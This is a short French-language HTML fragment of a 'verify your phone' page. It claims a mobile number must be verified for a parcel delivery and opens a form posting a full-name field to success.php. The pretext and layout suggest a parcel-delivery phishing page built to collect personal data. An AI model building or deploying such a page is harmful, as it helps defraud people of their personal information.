      ...
      <div id="page">
        <section class="page-container">
          ...
          <div class="in-panel mt-3">
            <h1 class="information-label-title">Vérifier le téléphone</h1>
            <h3 class="information-label">Pour assurer une livraison normale, vous devez vérifier votre numéro de téléphone portable</h3>
            <div class="form">
              <form method="post" action="success.php">
                <div class="form-body">
                  <div class="input mt-3">
                    <input class="touched  hide-error" type="text" name="fullname" id="fullname" aria-required="true" autocapitalize="none" value=""><span class="hide-error" id="">Mme/M. Prénom Nom</span>
                  </div>
                </div>
